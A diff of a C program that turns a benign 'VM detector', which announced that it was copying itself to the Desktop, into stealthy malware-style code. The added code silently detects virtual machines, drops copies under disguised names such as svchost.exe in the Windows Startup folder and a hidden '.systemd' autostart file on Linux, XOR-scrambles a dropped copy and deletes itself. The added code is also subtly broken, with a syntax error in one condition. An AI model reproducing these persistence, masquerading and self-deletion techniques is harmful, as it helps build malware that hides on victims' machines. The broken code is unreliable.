@@ -1,60 +1,58 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 
 #ifdef _WIN32
 #include <windows.h>
 #include <tchar.h>
+#include <tlhelp32.h>
 #else
 #include <unistd.h>
+#include <dirent.h>
 #endif
 
-int is_virtual_machine() {
-    #ifdef _WIN32
-    unsigned int hypervisorPresent = 0;
+int detect_vm() {
+    int detected = 0;
     
+    #ifdef _WIN32
     __asm {
         mov eax, 1
         cpuid
         bt ecx, 31
-        setc hypervisorPresent
+        setc detected
     }
-    
-    if (hypervisorPresent) {
-        return 1;
-    }
-    
+
+    if (detected) return 1;
+
     HKEY hKey;
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
-        "HARDWARE\\DESCRIPTION\\System\\BIOS", 
-        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        
-        char productName[256] = {0};
-        DWORD size = sizeof(productName);
-        
-        if (RegQueryValueEx(hKey, "SystemProductName", NULL, NULL, 
-            (LPBYTE)productName, &size) == ERROR_SUCCESS) {
-            
-            if (strstr(productName, "Virtual") || 
-                strstr(productName, "VMware") || 
-                strstr(productName, "VirtualBox") || 
-                strstr(productName, "QEMU")) {
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        char buf[256];
+        DWORD sz = sizeof(buf);
+        if (RegQueryValueEx(hKey, "SystemProductName", NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
+            if (strstr(buf, "Virtual") || strstr(buf, "VMware") || strstr(buf, "VirtualBox") || strstr(buf, "QEMU")) {
                 RegCloseKey(hKey);
                 return 1;
             }
         }
         RegCloseKey(hKey);
     }
-    
+
+    if (GetModuleHandle("vmmouse.sys") || GetModuleHandle("VBoxMouse.sys")) return 1;
+
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return 1;
+    }
+
     #else
     FILE *fp;
-    char buffer[128];
+    char buf[128];
 
     fp = popen("cat /sys/class/dmi/id/product_name 2>/dev/null", "r");
-    if (fp != NULL) {
-        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
-            if (strstr(buffer, "VirtualBox") || strstr(buffer, "VMware") ||
-                strstr(buffer, "QEMU") || strstr(buffer, "KVM")) {
+    if (fp) {
+        while (fgets(buf, sizeof(buf), fp)) {
+            if (strstr(buf, "VirtualBox") || strstr(buf, "VMware") || strstr(buf, "QEMU") || strstr(buf, "KVM")) {
                 pclose(fp);
                 return 1;
             }
@@ -63,9 +61,9 @@ int is_virtual_machine() {
     }
 
     fp = popen("grep -c hypervisor /proc/cpuinfo 2>/dev/null", "r");
-    if (fp != NULL) {
-        if (fgets(buffer, sizeof(buffer), fp) != NULL) {
-            if (atoi(buffer) > 0) {
+    if (fp) {
+        if (fgets(buf, sizeof(buf), fp) {
+            if (atoi(buf) > 0) {
                 pclose(fp);
                 return 1;
             }
@@ -77,53 +75,86 @@ int is_virtual_machine() {
     return 0;
 }
 
-void show_message(const char *message) {
+void encrypt_data(unsigned char *data, size_t len) {
+    const unsigned char key = 0x55;
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= key;
+    }
+}
+
+void copy_file(const char *src, const char *dst) {
     #ifdef _WIN32
-    MessageBox(NULL, message, "VM Detector", MB_OK | MB_ICONINFORMATION);
+    CopyFile(src, dst, FALSE);
     #else
-    printf("NOTIFICATION: %s\n", message);
-    char cmd[256];
-    snprintf(cmd, sizeof(cmd), "notify-send 'VM Detector' '%s'", message);
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\" 2>/dev/null", src, dst);
     system(cmd);
     #endif
 }
 
-void copy_to_host() {
+void persist() {
     #ifdef _WIN32
-    char exePath[MAX_PATH];
-    char destPath[MAX_PATH];
-    
-    GetModuleFileName(NULL, exePath, MAX_PATH);
-    
-    const char *userProfile = getenv("USERPROFILE");
-    snprintf(destPath, sizeof(destPath), "%s\\Desktop\\VM_Detector.exe", userProfile);
-    
-    if (CopyFile(exePath, destPath, FALSE)) {
-        show_message("Copied to host system: Desktop\\VM_Detector.exe");
-    } else {
-        show_message("Failed to copy to host system");
-    }
+    char path[MAX_PATH];
+    GetModuleFileName(NULL, path, MAX_PATH);
+    char newpath[MAX_PATH];
+    snprintf(newpath, sizeof(newpath), "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe", getenv("USERPROFILE"));
+    copy_file(path, newpath);
     #else
-    char cmd[512];
-    const char *home = getenv("HOME");
-    
-    snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s/.VM_Detector\" 2>/dev/null", 
-             "/proc/self/exe", home);
-    
-    if (system(cmd) == 0) {
-        show_message("Copied to host system: ~/.VM_Detector");
-    } else {
-        show_message("Failed to copy to host system");
-    }
+    char path[1024];
+    readlink("/proc/self/exe", path, sizeof(path));
+    char newpath[1024];
+    snprintf(newpath, sizeof(newpath), "%s/.config/autostart/.systemd", getenv("HOME"));
+    copy_file(path, newpath);
+    #endif
+}
+
+void self_remove() {
+    #ifdef _WIN32
+    char cmd[MAX_PATH + 10];
+    snprintf(cmd, sizeof(cmd), "ping 127.0.0.1 -n 2 > nul & del \"%s\"", __argv[0]);
+    system(cmd);
+    #else
+    system("sleep 1; rm -f \"$0\"");
     #endif
 }
 
 int main() {
-    if (is_virtual_machine()) {
-        show_message("Running on VM! Copying to host...");
-        copy_to_host();
-    } else {
-        show_message("Running on host system");
+    srand(time(NULL));
+    
+    if (detect_vm()) {
+        char src[1024];
+        #ifdef _WIN32
+        GetModuleFileName(NULL, src, sizeof(src));
+        #else
+        readlink("/proc/self/exe", src, sizeof(src));
+        #endif
+
+        char dst[1024];
+        #ifdef _WIN32
+        snprintf(dst, sizeof(dst), "%s\\Documents\\winhelper.exe", getenv("USERPROFILE"));
+        #else
+        snprintf(dst, sizeof(dst), "%s/.cache/.syshelper", getenv("HOME"));
+        #endif
+
+        copy_file(src, dst);
+        persist();
+        
+        FILE *fp = fopen(dst, "rb+");
+        if (fp) {
+            fseek(fp, 0, SEEK_END);
+            long len = ftell(fp);
+            fseek(fp, 0, SEEK_SET);
+            unsigned char *data = malloc(len);
+            fread(data, 1, len, fp);
+            encrypt_data(data, len);
+            fseek(fp, 0, SEEK_SET);
+            fwrite(data, 1, len, fp);
+            fclose(fp);
+            free(data);
+        }
+        
+        self_remove();
     }
+    
     return 0;
 }
